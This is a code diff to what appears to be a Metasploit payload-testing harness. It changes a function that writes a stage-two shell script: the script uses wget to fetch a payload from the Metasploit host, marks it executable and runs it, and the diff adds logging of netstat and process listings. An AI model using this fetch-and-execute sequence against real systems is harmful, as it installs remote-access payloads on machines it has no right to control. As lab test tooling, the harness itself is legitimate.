@@ -746,8 +746,9 @@ def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
         if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
             msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
             payloadFile = sessionData['PAYLOAD']['FILENAME']
-            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
-            stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
+            url = "'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'"
+            stageTwoShContent = stageTwoShContent + "echo URL =  " + url + " > " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "\nwget " + url + " >> " + remoteLogFile + " 2>&1\n"
             stageTwoShContent = stageTwoShContent + "sleep 5 \n"
             stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + "\n"
             if '.py' in payloadFile:
@@ -756,7 +757,9 @@ def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
                 stageTwoShContent = stageTwoShContent + targetData['METERPRETER_JAVA'] + " -jar " + payloadFile + "&\n"
             else:
                 stageTwoShContent = stageTwoShContent + "./" + payloadFile + "&\n"
-            stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " > " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "netstat -ant >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "ps -ef >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " >> " + remoteLogFile + "\n"
     return stageTwoShContent
 
 
@@ -1610,5 +1613,5 @@ def __matchListToCatalog(vm_List, catalog_file, logFile="default.log"):
             if "PASSWORD" not in final_vm:
                 logMsg(logFile, "NO PASSWORD FOR " + str(vm))
                 return False
-            defined_vms.append(final_vm)
+        defined_vms.append(final_vm)
     return defined_vms
